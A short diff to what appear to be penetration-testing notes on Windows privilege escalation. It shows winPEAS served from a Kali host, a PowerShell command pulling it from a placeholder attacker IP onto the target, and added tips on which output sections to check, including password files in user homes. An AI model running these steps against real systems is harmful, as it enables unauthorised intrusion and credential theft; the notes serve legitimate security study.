@@ -110,6 +110,11 @@ kali$ cd /usr/share/peass/winpeas/
 kali$ python3 -m http.server 8088
 PS> iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
 ```
+To check, never blindly trust the output of a tool:
+- _Basic System Information_
+- _Users_ output section
+- information about processes, services, scheduled tasks, network information, and installed applications
+- _Looking for possible password files in users homes_
 
 #### Other tools
 
